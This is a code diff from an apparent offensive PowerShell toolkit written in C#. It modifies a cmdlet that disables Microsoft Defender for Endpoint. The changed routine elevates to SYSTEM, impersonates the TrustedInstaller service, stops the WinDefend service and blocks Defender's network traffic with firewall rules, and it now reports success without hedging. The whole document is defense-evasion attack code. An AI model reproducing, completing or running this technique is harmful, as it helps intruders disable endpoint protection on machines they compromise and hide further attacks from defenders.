@@ -19,6 +19,7 @@ namespace TurtleToolKit
         protected override void ProcessRecord()
         {
             base.ProcessRecord();
+            WriteWarning("Need to elevate to SYSTEM for this");
             ExecuteDisableDefenderForEndpoint();
             return;
         }
@@ -32,15 +33,18 @@ namespace TurtleToolKit
         {
             try { 
                 ExecuteFirewallBlock();
+                Impersonator.ElevateToSystem();
                 Services.StartTrustedInstaller();
                 Impersonator.ElevateToTs();
                 Services.StopWinDefend();
                 ExecuteFirewallBlock();
-                WriteVerbose("successfully disabled defender maybe");
+                WriteVerbose("successfully disabled defender");
+                Impersonator.RevokePrivs();
                 return true;
             } catch
               {
-                WriteWarning("Failed to disable defender most likely");
+                WriteWarning("Failed to disable defender");
+                Impersonator.RevokePrivs();
                 return false;
             }
         }
